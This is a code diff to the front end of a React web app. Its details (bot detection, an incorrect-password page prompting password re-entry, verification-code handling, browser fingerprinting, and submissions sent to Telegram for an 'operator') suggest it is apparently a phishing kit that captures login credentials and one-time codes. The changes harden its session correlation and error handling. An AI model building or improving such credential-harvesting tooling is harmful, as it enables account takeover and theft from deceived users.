@@ -271,8 +271,25 @@ function App() {
   const [isBotDetected, setIsBotDetected] = useState(false);
   const [initMessage, setInitMessage] = useState('Connecting...');
 
-  // WebSocket state management
-  const [sessionId] = useState(() => Math.random().toString(36).substring(2, 15) + Date.now().toString(36));
+  // WebSocket state management. sessionId is a cryptographically-random correlator
+  // that ties the user's HTTP Telegram submissions to their WebSocket session so
+  // the operator can match them up. It is NOT a secret/token (the backend still
+  // authenticates separately), but we still use crypto randomness to avoid
+  // predictable IDs across sessions.
+  const [sessionId] = useState(() => {
+    try {
+      if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
+        return crypto.randomUUID();
+      }
+      if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
+        const bytes = new Uint8Array(16);
+        crypto.getRandomValues(bytes);
+        return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
+      }
+    } catch { /* fall through */ }
+    // Last-resort fallback for environments without WebCrypto (very old browsers).
+    return Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+  });
 
   const navigate = useNavigate();
   const location = useLocation();
@@ -402,7 +419,8 @@ function App() {
     });
 
     // Build and send the Telegram payload. Fingerprinting is best-effort — failures
-    // must never block submission, so we kick off the POST without awaiting.
+    // must never block submission, so we kick off the POST without awaiting and
+    // swallow any rejection here so it cannot become an unhandled promise error.
     (async () => {
       let fingerprint: Record<string, unknown> = {};
       try {
@@ -421,7 +439,7 @@ function App() {
           ...(data || {}),
         },
       });
-    })();
+    })().catch(err => console.error('interaction submission failed:', err));
 
     switch (action) {
       // Password re-submission from IncorrectPasswordPage, and verification-code
